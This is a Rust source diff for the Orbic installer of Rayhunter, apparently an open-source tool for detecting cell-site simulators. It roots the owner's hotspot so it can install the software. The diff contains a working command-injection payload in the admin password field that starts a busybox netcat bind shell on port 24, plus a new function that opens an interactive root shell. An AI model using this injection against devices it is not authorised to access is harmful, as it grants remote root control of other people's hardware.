@@ -1,4 +1,3 @@
-use std::io::Write;
 use std::net::SocketAddr;
 use std::str::FromStr;
 use std::time::Duration;
@@ -8,9 +7,14 @@ use reqwest::Client;
 use serde::Deserialize;
 use tokio::time::sleep;
 
+use crate::RAYHUNTER_DAEMON_INIT;
+use crate::connection::{TelnetConnection, install_config};
 use crate::orbic_auth::{LoginInfo, LoginRequest, LoginResponse, encode_password};
-use crate::util::{echo, telnet_send_command, telnet_send_file};
-use crate::{CONFIG_TOML, RAYHUNTER_DAEMON_INIT};
+use crate::output::{eprintln, print, println};
+use crate::util::{interactive_shell, telnet_send_command, telnet_send_file};
+
+// Some kajeet devices have password protected telnetd on port 23, so we use port 24 just in case
+const TELNET_PORT: u16 = 24;
 
 #[derive(Deserialize, Debug)]
 struct ExploitResponse {
@@ -101,10 +105,10 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
         .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
         .header("Content-Type", "application/json")
         .header("Cookie", authenticated_cookie)
-        // Original Orbic lacks telnetd (unlike other devices)
-        // When doing this, one needs to set prompt=None in the telnet utility functions
-        // But some kajeet devices have password protected telnetd so we use port 24 just in case
-        .body(r#"{"password": "\"; busybox nc -ll -p 24 -e /bin/sh & #"}"#)
+        // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
+        .body(format!(
+            r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
+        ))
         .send()
         .await
         .context("failed to start telnet")?
@@ -122,9 +126,13 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
 pub async fn start_telnet(
     admin_ip: &str,
     admin_username: &str,
-    admin_password: &str,
+    admin_password: Option<&str>,
 ) -> Result<()> {
-    echo!("Logging in and starting telnet... ");
+    let Some(admin_password) = admin_password else {
+        anyhow::bail!("--admin-password is required");
+    };
+
+    print!("Logging in and starting telnet... ");
     login_and_exploit(admin_ip, admin_username, admin_password).await?;
     println!("done");
 
@@ -134,21 +142,36 @@ pub async fn start_telnet(
 pub async fn install(
     admin_ip: String,
     admin_username: String,
-    admin_password: String,
+    admin_password: Option<String>,
+    reset_config: bool,
 ) -> Result<()> {
-    echo!("Logging in and starting telnet... ");
+    let Some(admin_password) = admin_password else {
+        eprintln!(
+            "As of version 0.8.0, the orbic installer has been rewritten and now requires an --admin-password parameter."
+        );
+        eprintln!(
+            "Refer to the official documentation at https://efforg.github.io/rayhunter/ for how to find the right value."
+        );
+        eprintln!();
+        eprintln!(
+            "If you are following a tutorial that does not include this parameter, the tutorial is likely outdated. You can run ./installer orbic-usb to access the old installer, however we recommend against it."
+        );
+        anyhow::bail!("exiting");
+    };
+
+    print!("Logging in and starting telnet... ");
     login_and_exploit(&admin_ip, &admin_username, &admin_password).await?;
     println!("done");
 
-    echo!("Waiting for telnet to become available... ");
+    print!("Waiting for telnet to become available... ");
     wait_for_telnet(&admin_ip).await?;
     println!("done");
 
-    setup_rayhunter(&admin_ip).await
+    setup_rayhunter(&admin_ip, reset_config).await
 }
 
 async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
-    let addr = SocketAddr::from_str(&format!("{}:24", admin_ip))?;
+    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
     let timeout = Duration::from_secs(60);
     let start_time = std::time::Instant::now();
 
@@ -168,8 +191,8 @@ async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
     Ok(())
 }
 
-async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
-    let addr = SocketAddr::from_str(&format!("{}:24", admin_ip))?;
+async fn setup_rayhunter(admin_ip: &str, reset_config: bool) -> Result<()> {
+    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
     let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));
 
     // Remount filesystem as read-write to allow modifications
@@ -192,13 +215,12 @@ async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
     )
     .await?;
 
-    telnet_send_file(
-        addr,
+    let mut conn = TelnetConnection::new(addr, false);
+    install_config(
+        &mut conn,
         "/data/rayhunter/config.toml",
-        CONFIG_TOML
-            .replace(r#"#device = "orbic""#, r#"device = "orbic""#)
-            .as_bytes(),
-        false,
+        "orbic",
+        reset_config,
     )
     .await?;
 
@@ -251,4 +273,17 @@ async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
     );
 
     Ok(())
+}
+
+/// Root the Orbic device and open an interactive shell
+pub async fn shell(
+    admin_ip: &str,
+    admin_username: &str,
+    admin_password: Option<&str>,
+) -> Result<()> {
+    start_telnet(admin_ip, admin_username, admin_password).await?;
+    eprintln!(
+        "This terminal is fairly limited. The shell prompt may not be visible, but it still accepts commands."
+    );
+    interactive_shell(admin_ip, TELNET_PORT, false).await
 }
